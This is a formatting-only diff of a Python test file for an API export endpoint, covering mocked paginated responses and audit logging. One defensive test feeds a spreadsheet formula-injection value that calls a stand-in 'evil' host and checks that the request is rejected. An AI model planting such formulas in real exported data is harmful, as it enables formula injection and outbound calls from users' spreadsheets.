@@ -79,6 +79,7 @@ def _mock_graph_response(events: list[dict]):
     The handler drives a cursor-pagination loop even for small result
     sets, so the stub must always return a terminator payload.
     """
+
     class _Resp:
         status_code = 200
 
@@ -108,6 +109,7 @@ def _mock_paginated_graph_response(pages: list[dict]):
     [...], "has_more": bool, "next_cursor": str|None}`` dicts that
     will be returned in order on successive ``client.get`` calls.
     """
+
     class _Resp:
         status_code = 200
 
@@ -205,7 +207,7 @@ def test_1283_rejects_requesting_entity_with_formula_prefix(client):
         params={
             "start_date": "2026-04-01",
             "end_date": "2026-04-17",
-            "requesting_entity": "=WEBSERVICE(\"http://evil\")",
+            "requesting_entity": '=WEBSERVICE("http://evil")',
         },
     )
     assert r.status_code == 400
@@ -291,10 +293,7 @@ def test_1291_zero_events_still_records_empty_audit_line(client, caplog):
     assert r.status_code == 404
     # An ``fda_export_empty`` audit line must have been emitted so a
     # spike in zero-result queries is observable.
-    empties = [
-        r for r in caplog.records
-        if r.name == "compliance-audit" and r.msg == "fda_export_empty"
-    ]
+    empties = [r for r in caplog.records if r.name == "compliance-audit" and r.msg == "fda_export_empty"]
     assert empties
 
 
